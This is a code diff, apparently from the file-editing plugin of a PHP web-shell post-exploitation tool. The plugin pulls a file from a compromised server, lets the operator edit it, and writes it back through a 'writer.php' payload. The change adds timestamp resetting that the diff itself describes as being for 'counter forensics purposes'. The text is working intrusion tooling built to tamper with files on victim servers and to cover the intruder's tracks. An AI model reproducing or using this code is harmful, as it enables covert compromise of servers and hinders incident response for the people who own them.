@@ -12,6 +12,8 @@ DESCRIPTION:
     edited. When leaving the text editor, the plugin checks if
     the content has changed, and automatically uploads the new
     file content to the remote server.
+    - The plugin will automatically try to reset file modification
+    time ot it previous value, for counter forensics purposes.
 
 EXAMPLES:
     > edit ../includes/connect.inc.php
@@ -47,7 +49,8 @@ if reader_response == "NEW_FILE":
     print("[*] Creating new file: %s" % absolute_path)
 else:
     # writting bytes() obj to file in binary mode
-    file.write(base64.b64decode(reader_response), bin_mode=True)
+    file_mtime, file_data = reader_response
+    file.write(base64.b64decode(file_data), bin_mode=True)
 
 modified = file.edit()
 if not modified:
@@ -59,6 +62,11 @@ if not modified:
 writer = server.payload.Payload("writer.php")
 writer['FILE'] = absolute_path
 writer['DATA'] = base64.b64encode(file.read(bin_mode=True)).decode()
+writer['MTIME'] = file_mtime
 
 writer_response = writer.send()
+
+if writer_response == "MTIME_FAILED":
+    print("[-] %s: Could not set MTIME to %r" % (plugin.argv[0], file_mtime))
+
 print("[*] File correctly written at %s" % absolute_path)
